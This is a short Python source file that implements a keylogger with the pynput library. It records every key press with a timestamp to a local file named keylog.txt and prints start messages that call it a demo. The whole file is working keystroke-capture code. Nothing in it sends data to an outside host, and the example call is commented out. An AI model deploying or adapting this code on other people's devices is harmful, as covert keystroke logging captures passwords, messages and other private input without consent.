from pynput.keyboard import Listener
import logging
import os

def start_keylogger(log_file="keylog.txt"):
    """
    Starts a keyboard listener and logs keystrokes to a file.
    """
    # Ensure the log file is in a safe place or specified path
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        try:
            logging.info(str(key))
        except Exception as e:
            print(f"Error: {e}")

    print(f"[*] Keylogger started. Logging to {log_file}...")
    print("[*] Press Ctrl+C in the console to stop (for this demo).")
    
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Example usage (uncomment to test locally)
    # start_keylogger()
    pass
